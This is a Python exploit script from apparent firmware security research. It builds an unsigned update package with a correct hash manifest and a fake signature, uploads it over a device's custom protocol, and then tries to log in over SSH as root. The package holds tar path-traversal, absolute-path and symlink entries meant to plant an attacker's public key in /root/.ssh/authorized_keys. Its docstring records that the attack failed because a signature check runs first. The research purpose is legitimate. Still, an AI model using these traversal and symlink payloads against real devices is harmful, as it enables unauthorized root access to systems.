#!/usr/bin/env python3
"""update_traversal_probe.py - update-package tar traversal/symlink test.

RESULT (2026-10-13): DISPROVEN. Two packages were uploaded to completion:
a small one (df-marker + traversal entries) and this one (~119 MB
uncompressed of zeros, ~116 KB on the wire, correct member names/sizes,
hash-correct SHA1SUMS, garbage 512-byte SIG, traversal + symlink attack
members). No traversal/symlink write occurred (SSH login stays denied,
no df marker), and the finalize Disconnect arrives 0.06 s after the last
chunk even for 119 MB of content: the device never processes unsigned
package content - the RSA-4096 gate over SHA1SUMS runs before any
gunzip/extract/hash. See docs/SECURITY_ANALYSIS.md section 6.8.

Uploads a structurally-correct, big (~119 MB uncompressed, ~117 KB on the
wire: zeros) unsigned package with a hash-correct SHA1SUMS manifest and a
garbage 512-byte SIG. Measures the delay between the final chunk and the
server's Disconnect:
  - instant  -> content is never touched before the signature gate
  - delayed  -> gunzip/extract/hash runs first (unpack-before-verify)

The package also carries symlink-based authorized_keys attack entries
(a directory symlink + a file through it), which survive "../"-stripping
sanitizers:
  d1 -> /root/.ssh            d1/authorized_keys = attacker pubkey
  d2 -> ../../../../root/.ssh d2/authorized_keys = attacker pubkey
plus the plain traversal and absolute entries.
"""
import hashlib, io, socket, struct, subprocess, sys, tarfile, time

HOST = "192.168.3.1"; PORT = 34566
PUBKEY_FILE = "/tmp/nofio-keys/id_ed25519.pub"
CHUNK = 65523
BIN_SIZE = 59_459_968  # matches the real base/head_BOOT.BIN size

def build_package():
    pubkey = open(PUBKEY_FILE).read().strip().encode() + b"\n"
    entries = []   # (name, kind, data/linkname)

    entries.append(("base_BOOT.BIN", "file", b"\x00" * BIN_SIZE))
    entries.append(("head_BOOT.BIN", "file", b"\x00" * BIN_SIZE))
    entries.append(("hardware", "file", b"nofio1\n"))
    # symlink attacks (survive leading-.. stripping)
    entries.append(("d1", "link", "/root/.ssh"))
    entries.append(("d1/authorized_keys", "file", pubkey))
    entries.append(("d2", "link", "../../../../root/.ssh"))
    entries.append(("d2/authorized_keys", "file", pubkey))
    # traversal + absolute variants
    entries.append(("../../../root/.ssh/authorized_keys", "file", pubkey))
    entries.append(("../../../../../root/.ssh/authorized_keys", "file", pubkey))
    entries.append(("/root/.ssh/authorized_keys", "file", pubkey))

    sums = b""
    for name, kind, data in entries:
        if kind == "file":
            # stream-hash the big entries
            h = hashlib.sha1(data).hexdigest()
            sums += f"{h}  {name}\n".encode()
    entries.append(("SHA1SUMS", "file", sums))
    entries.append(("SHA1SUMS.SIG", "file", b"S" * 512))

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", compresslevel=6) as tf:
        for name, kind, data in entries:
            ti = tarfile.TarInfo(name=name)
            if kind == "file":
                ti.size = len(data)
                ti.mode = 0o644
                tf.addfile(ti, io.BytesIO(data))
            else:  # symlink
                ti.type = tarfile.SYMTYPE
                ti.linkname = data
                ti.mode = 0o777
                tf.addfile(ti)
    pkg = buf.getvalue()
    with open("/tmp/fake-update-big.tar.gz", "wb") as f:
        f.write(pkg)
    return pkg

def pkt(src, dst, seq, opts, payload=b""):
    return struct.pack(">BBIBH", src, dst, seq, opts, len(payload)) + payload

def msg(tag, t, body=b""):
    return struct.pack(">HH", tag, t) + body

def meta_body(ft, count, final, name):
    return struct.pack(">BHHB", ft, count, final, len(name)) + name

def data_body(idx, payload):
    return struct.pack(">H", idx) + payload

def recv_one(s, timeout):
    s.settimeout(timeout)
    t0 = time.time()
    try:
        hdr = b""
        while len(hdr) < 9:
            c = s.recv(9 - len(hdr))
            if not c: return ("closed", time.time() - t0, b"")
            hdr += c
        src, dst, seq, opts, ln = struct.unpack(">BBIBH", hdr)
        body = b""
        while len(body) < ln:
            c = s.recv(ln - len(body))
            if not c: return ("closed", time.time() - t0, b"")
            body += c
        return ("msg", time.time() - t0, body)
    except socket.timeout:
        return ("timeout", time.time() - t0, b"")

def upload(pkg, name="linux.ub"):
    n_full = len(pkg) // CHUNK
    final = len(pkg) - n_full * CHUNK
    if final == 0:
        n_full -= 1
        final = CHUNK
    count = n_full + 1
    print(f"[*] package {len(pkg)} B on the wire -> {n_full} full + final {final} B "
          f"(declared: {BIN_SIZE*2 + 24} B uncompressed entries)")

    s = socket.create_connection((HOST, PORT), timeout=3)
    try:
        s.sendall(pkt(0, 1, 0, 3, msg(0x4001, 2, struct.pack(">I", 80))))
        s.recv(65536)
        s.sendall(pkt(0, 1, 1, 3, msg(0x4001, 0)))
        s.sendall(pkt(0, 1, 2, 3, msg(0x4002, 135,
                   meta_body(2, count, final, name.encode()))))
        kind, dt, body = recv_one(s, 3.0)
        print(f"  meta -> {kind} after {dt:.2f}s body={body.hex()}")
        if kind != "msg" or len(body) < 4 or struct.unpack('>H', body[2:4])[0] != 0:
            print("  (meta not Ack'd, abort)")
            return
        for i in range(count):
            chunk = pkg[i * CHUNK:(i + 1) * CHUNK] if i < n_full else pkg[n_full * CHUNK:]
            s.sendall(pkt(0, 1, 3 + i, 3, msg(0x4002, 137, data_body(i, chunk))))
        t_final = time.time()
        # observe everything after the final chunk
        while True:
            kind, dt, body = recv_one(s, 30.0)
            at = time.time() - t_final
            if kind == "timeout":
                print(f"  <- timeout after {at:.2f}s (no more replies)")
                break
            if kind == "closed":
                print(f"  <- connection closed by device {at:.2f}s after final chunk")
                break
            tag, mt = struct.unpack(">HH", body[:4]) if len(body) >= 4 else (0, 0)
            rest = body[4:]
            txt = bytes(b if 32 <= b < 127 else 0x2E for b in rest).decode("ascii")
            print(f"  <- type={mt} tag=0x{tag:04x} after {at:.2f}s len={len(rest)} "
                  f"body={rest.hex()[:120]}"
                  + (f" ascii='{txt}'" if txt.strip('.') else ""))
            if mt == 3:
                print("  (Disconnect)")
                break
    finally:
        try: s.close()
        except Exception: pass

def try_ssh():
    cmd = ["ssh", "-i", "/tmp/nofio-keys/id_ed25519",
           "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
           "-o", "UserKnownHostsFile=/dev/null", "-o", "IdentitiesOnly=yes",
           "-o", "ConnectTimeout=5", "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
           f"root@{HOST}", "id"]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
    return r.returncode == 0, (r.stdout + r.stderr).strip()

def main():
    pkg = build_package()
    print(f"[*] built big fake package ({len(pkg)} B wire)")
    upload(pkg)
    print("[*] SSH login attempt...")
    ok, out = try_ssh()
    if ok:
        print(f"[+] SSH LOGIN SUCCEEDED: {out}")
        return 0
    print(f"[-] ssh failed: {out[-120:]}")
    return 1

if __name__ == "__main__":
    sys.exit(main())
